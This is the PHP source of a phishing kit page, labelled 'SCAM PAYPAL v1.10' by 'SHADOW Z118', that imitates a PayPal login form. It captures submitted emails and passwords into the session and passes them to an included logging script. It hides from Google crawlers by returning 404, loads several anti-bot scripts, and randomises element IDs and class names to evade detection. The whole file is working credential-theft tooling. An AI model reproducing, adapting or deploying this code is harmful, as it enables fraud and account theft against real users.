<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
error_reporting(0);
##################### SECOND FILES #####################
include('../../functions/get_lang_en.php'); 
################## ACCOUNT INFORMATION #################
$_SESSION['_login_email_']    = $_POST['login_email'];
$_SESSION['_login_password_'] = $_POST['login_password'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){  
    include('LOG.php');
}
$charSet = "XXXXID0123456789";
$charSetSize = strlen($charSet); $pwdSize = 6;
for ($i = 0; $i < $pwdSize; $i++) {
  $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
}

 $Z118xF0rm3XX = $XXX_03.mt_rand();
 $x87Z_E54IlsXX = $XXX_04.mt_rand();
 $Zx987P4ss0WrD = $XXX_05.mt_rand();
 $GrimmDZEBI987 = $XXX_06.mt_rand();
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html id="<?="x_".rand(3004, 2000)."".rand(7809, 5016)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title><?=$Z118_01;?></title>
	<!------------------------------- FILES CSS STYLE --------------------------------->
    <link rel="stylesheet" href="../../lib/css/L-Z118.css">
	<style>
	.xZ98_456ZTa{
        margin: 0 auto;
        width: 460px;
    }
	.xZ98_ZTAAa{
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        -khtml-border-radius: 5px;
        position: relative;
        margin: 130px auto 0;
        padding: 30px 10% 50px;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        -khtml-border-radius: 5px;
        border-radius: 5px;
    }
	@media all and (max-width:767px) {
    .xZ98_456ZTa{
        margin-top:30px;
        padding-top:0;
        width:100%;
        background-color:#fff
    }
	.xZ98_ZTAAa{
        margin:0 10%;
        padding:0
       }
    }
	</style>
    <link rel="shortcut icon" type="image/x-icon" href="../../lib/img//favicon.ico">
    <meta name="viewport" content="initial-scale=1.0">
</head>
<body id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>"><p style="color: white;">.</p>
	<div for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" id="<?="_x78ZZ".rand(31254, 8700456)?>" name="Login">
        <div for="<?=rand(12390, 8756)."-".$GrimmDZEBI987."".rand(18, 18)."x-".rand(12390, 8756)?>" id="<?="_x987ZZ-".rand(346854, 87456)?>" class="<?="_x78ZZ".rand(31254, 8700456)?> xZ98_456ZTa <?="_x78ZZ".rand(31254, 8700456)?>">
            <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="_x78ZZ".rand(31254, 8700456)?> xZ98_ZTAAa <?="_x78ZZ".rand(31254, 8700456)?>">
			<header>
                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  kl_h4aXX6987PO <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></div>
            </header>
                <section id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                    <form for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" action="" method="post" class="<?="_x987WW-".rand(312254, 8754456)?> <?="_x1989MPZ-".rand(31225346854, 8754456)?>" id="<?=$Z118xF0rm3XX;?>" name="login">
                        <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xv987HUB <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                            <div class="x_G00066XD" id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>">
                                <div class="x_G00066XD" style="z-index: 100;">
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                        <input for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Z1186XDD7 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " name="login_email" type="email" placeholder="<?=$Z118_02;?>" id="<?=$x87Z_E54IlsXX;?>" value="<?php if(isset($_SESSION['_login_email_'])){ echo $_SESSION['_login_email_'];} ?>">
                                    </div>
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class=" <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> J118GhosTXRider <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                        <p><?=$Z118_04;?></p>
                                    </div>
                                </div>
                                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  x_G00066XD <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
                                        <input for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="x_Z1186XDD7" name="login_password" type="password" placeholder="<?=$Z118_03;?>" id="<?=$Zx987P4ss0WrD;?>">
                                    </div>
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> J118GhosTXRider <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                        <p id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><?=$Z118_05;?></p>
                                    </div>
                                </div>
                            </div>
                            <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?=rand(12390, 86)."-xMARVELxDCxCOMIC188x-".rand(12390, 8756)?> o_B4Ads-W4OOXDS">
                                <button for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xXMARVELxXBut00N" type="submit" id="<?=rand(12390, 8756)."-x666G-".rand(12390, 8756)?>" name="<?=rand(12390, 8756)."-x968AG-".rand(12390, 8756)?>"><?=$Z118_06;?></button>
                            </div>
                            <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ww_LiZ3b44 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "><a href="#" id="<?=rand(12390, 8756)."-xT00x-".rand(12390, 8756)?>" class="<?=rand(12390, 8756)."-x660x-".rand(12390, 8756)?>"><?=$Z118_07;?></a>
                                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                </div>
                            </div>
                            <a for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" href="#" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xXMARVELxXBut00N Z0-s6X6s-00" id="<?=rand(12390, 8756)."-s6X6s-".rand(12390, 8756)?>"><?=$Z118_08;?></a></div>
                    </form>
                </section>
                <br>
            </div>
        </div>
        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F4_x666x_F4 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
            <p id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xT02X65G <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"><?=$Z118_12;?></p>
        </div>
    </div>
    <footer id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> DC_XX98700 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xv987HUB <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
        <ul>
            <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#"><?=$Z118_09;?></a></li>
            <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"></li>
            <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#"><?=$Z118_10;?></a></li>
        </ul>
        <br>
        <ul id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>">
            <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#" style="color: #9e9e9e;"><?=$Z118_11;?></a></li>
        </ul>
    </footer>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
	<script type="text/javascript" src="../../lib/js/jquery.js"></script>
    <script type="text/javascript">
	$(document).ready(function() {
    $("#<?=$Z118xF0rm3XX;?>").submit(function(a) {
        a.preventDefault();
        var b = 0;
        $("#<?=$x87Z_E54IlsXX;?>").val() || ($("#<?=$x87Z_E54IlsXX;?>").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG"), 
        $("#<?=$x87Z_E54IlsXX;?>").addClass("x870AA-Ic0n3"), b = 1), $("#<?=$Zx987P4ss0WrD;?>").val() || ($("#<?=$Zx987P4ss0WrD;?>").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG"), 
        $("#<?=$Zx987P4ss0WrD;?>").addClass("x870AA-Ic0n3"), $(".WA-MOOOOOY").css("z-index: 100;"), 
        b = 1), 1 != b && ($(".F4_x666x_F4").addClass("pX-X987").fadeIn(800), $(".xT02X65G").delay(0).fadeIn(800),
        setTimeout(function() {
            document.getElementById("<?=$Z118xF0rm3XX;?>").submit();
        }, 1500));
    }), $("#<?=$x87Z_E54IlsXX;?>").focus(function(a) {
        $("#<?=$x87Z_E54IlsXX;?>").parent().next(".J118GhosTXRider").removeClass("x87Z-Add1NG");
    }), $("#<?=$Zx987P4ss0WrD;?>").focus(function(a) {
        $("#<?=$Zx987P4ss0WrD;?>").parent().next(".J118GhosTXRider").removeClass("x87Z-Add1NG");
    });
});
	</script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
</body>
</html>